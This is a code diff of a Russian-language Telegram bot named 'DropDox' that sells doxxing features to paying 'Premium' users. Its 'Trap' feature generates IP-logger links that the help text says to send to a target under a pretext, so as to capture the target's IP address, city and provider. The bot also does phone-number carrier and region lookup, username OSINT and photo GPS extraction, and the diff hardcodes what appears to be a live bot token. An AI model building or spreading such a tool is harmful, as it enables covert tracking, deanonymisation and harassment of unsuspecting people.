@@ -4,15 +4,12 @@ import json
 import requests
 import phonenumbers
 from datetime import datetime, timedelta
-from PIL import Image
-from PIL.ExifTags import TAGS
-from phonenumbers import carrier, geocoder
 from aiogram import Bot, Dispatcher, executor, types
 
 # --- [ КОНФИГУРАЦИЯ ] ---
 API_TOKEN = '8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
 OWNER_ID = 8380479728 
-LOGGER_URL = "https://portfolio-myweb.up.railway.app/track"
+LOGGER_URL = "https://portfolio-myweb.up.railway.app/track" 
 DATA_FILE = "users_db.json"
 
 logging.basicConfig(level=logging.INFO)
@@ -44,37 +41,54 @@ def get_role(user_id):
             save_db(db)
     return "User"
 
-# --- [ ОБРАБОТКА КОМАНД ] ---
-@dp.message_handler(commands=['start'])
-async def start(m: types.Message):
+# --- [ ТЕКСТЫ ИНФОРМАЦИИ ] ---
+USER_INFO = (
+    "<b>ℹ️ Справка для пользователя:</b>\n\n"
+    "🪤 <b>Trap</b> — Создает твою личную ссылку-ловушку. Кто перейдет — того пробьем.\n"
+    "📱 <b>Dox Phone</b> — Поиск инфо по номеру (Оператор, Регион).\n"
+    "👤 <b>Dox User</b> — OSINT поиск по никнейму (доступно Premium).\n"
+    "🖼 <b>EXIF Data</b> — Анализ фото и GPS (доступно Premium).\n\n"
+    "<i>Для получения Premium обратитесь к @админу.</i>"
+)
+
+ADMIN_INFO = (
+    "<b>🛠 ПАНЕЛЬ УПРАВЛЕНИЯ (ADMIN):</b>\n\n"
+    "🔹 <b>Выдать доступ:</b>\n<code>/give_access [ID] [Дни]</code>\n"
+    "🔹 <b>Забанить:</b>\n<code>/ban [ID]</code>\n"
+    "🔹 <b>Статистика:</b> Кнопка 📊 Stats\n"
+    "🔹 <b>Копии логов:</b> Тебе приходят копии отчетов твоих юзеров.\n"
+    "--------------------------------\n"
+)
+
+# --- [ ОБРАБОТЧИКИ ] ---
+
+@dp.message_handler(commands=['start', 'help'])
+async def cmd_start_help(m: types.Message):
     role = get_role(m.from_user.id)
     if role == "Banned": return
+
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
     kb.add("🪤 Trap", "📱 Dox Phone")
-    if role in ["Premium", "Admin", "Owner"]: kb.add("👤 Dox User", "🖼 EXIF Data")
-    if role in ["Owner", "Admin"]: kb.add("📊 Stats", "🚨 Panic")
-    await m.answer(f"🦾 <b>DropDox v0.5.5
-    Доступные функции:
-🪤 Trap (Ловушка): Бот создаст для тебя персональную ссылку. Скинь её цели под любым предлогом (например, «посмотри мои фотки»). Как только цель кликнет — бот пришлет тебе её IP, город и провайдера.
-📱 Dox Phone: Просто отправь номер телефона в формате +7... или +996..., и бот покажет, какому оператору он принадлежит и из какого региона.
-👤 Dox User (Premium): Введи никнейм @username, и бот найдет аккаунты в соцсетях и другие следы в сети.
-🖼 EXIF Data (Premium): Отправь фото файлом (без сжатия). Бот вытащит из него скрытую инфу: модель телефона и даже GPS-координаты места, где было сделано фото.
-Как получить Premium?
-Обратитесь к администратору.
-Доступ выдается на определенное время (от 1 дня до года).</b>\nСтатус: <b>{role}</b>", reply_markup=kb, parse_mode="HTML")
+    if role in ["Premium", "Admin", "Owner"]:
+        kb.add("👤 Dox User", "🖼 EXIF Data")
+    if role in ["Owner", "Admin"]:
+        kb.add("📊 Stats", "🚨 Panic")
+
+    # Формируем текст ответа в зависимости от роли
+    response = ""
+    if role in ["Owner", "Admin"]:
+        response = ADMIN_INFO + USER_INFO
+    else:
+        response = f"🦾 <b>DropDox v0.5.5</b>\nТвой статус: <b>{role}</b>\n\n" + USER_INFO
+
+    await m.answer(response, reply_markup=kb, parse_mode="HTML")
 
 @dp.message_handler(lambda m: m.text == "🪤 Trap")
 async def trap_handler(m: types.Message):
     uid = m.from_user.id
     role = get_role(uid)
-    if role == "Banned": return
-
-    # Создаем персональную ссылку с типом роли
     link = f"{LOGGER_URL}?owner={uid}&type={role.lower()}"
-    
-    text = f"🛡 <b>{role}Link:</b>\n<code>{link}</code>\n\n"
-    text += "<i>Отчет придет лично тебе, когда цель перейдет по ссылке.</i>"
-    await m.answer(text, parse_mode="HTML")
+    await m.answer(f"🛡 <b>{role}Link:</b>\n<code>{link}</code>\n\nОтчет придет сюда.", parse_mode="HTML")
 
 @dp.message_handler(commands=['give_access'])
 async def access(m: types.Message):
@@ -87,44 +101,25 @@ async def access(m: types.Message):
         db["premium"][str(target_id)] = expiry
         save_db(db)
         await m.answer(f"✅ Доступ для {target_id} выдан до {expiry}")
-    except: await m.answer("Юзай: /give_access ID ДНИ")
-
-@dp.message_handler(commands=['set_admin'])
-async def set_admin(m: types.Message):
-    if get_role(m.from_user.id) != "Owner": return
-    try:
-        uid = int(m.get_args())
-        db = load_db()
-        if uid not in db["admins"]: db["admins"].append(uid)
-        save_db(db)
-        await m.answer(f"🛠 Пользователь {uid} теперь Админ.")
-    except: await m.answer("Юзай: /set_admin ID")
+    except:
+        await m.answer("Формат: <code>/give_access 1234567 30</code>", parse_mode="HTML")
 
 @dp.message_handler(lambda m: m.text == "📊 Stats")
-async def show_stats(m: types.Message):
+async def stats(m: types.Message):
     if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
     db = load_db()
     text = (f"📊 <b>Статистика:</b>\n"
-            f"Премиум юзеров: {len(db['premium'])}\n"
-            f"Админов: {len(db['admins'])}\n"
-            f"В бане: {len(db['banned'])}")
+            f"Premium: {len(db['premium'])}\n"
+            f"Admins: {len(db['admins'])}\n"
+            f"Banned: {len(db['banned'])}")
     await m.answer(text, parse_mode="HTML")
 
 @dp.message_handler(lambda m: m.text == "🚨 Panic")
 async def panic(m: types.Message):
     if get_role(m.from_user.id) != "Owner": return
-    await m.answer("🚨 СИСТЕМА ОСТАНОВЛЕНА")
+    await m.answer("🚨 СИСТЕМА ВЫКЛЮЧЕНА")
     os._exit(0)
-
-# --- [ ФУНКЦИИ ПРОБИВА (ОСТАЛЬНЫЕ) ] ---
-@dp.message_handler(lambda m: m.text.startswith('+'))
-async def ph(m: types.Message):
-    try:
-        num = phonenumbers.parse(m.text)
-        info = f"📡 {carrier.name_for_number(num, 'ru')}\n🌍 {geocoder.description_for_number(num, 'ru')}"
-        await m.answer(f"🔍 <b>Номер:</b>\n{info}", parse_mode="HTML")
-    except: await m.answer("❌ Ошибка формата")
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
-                    
+    
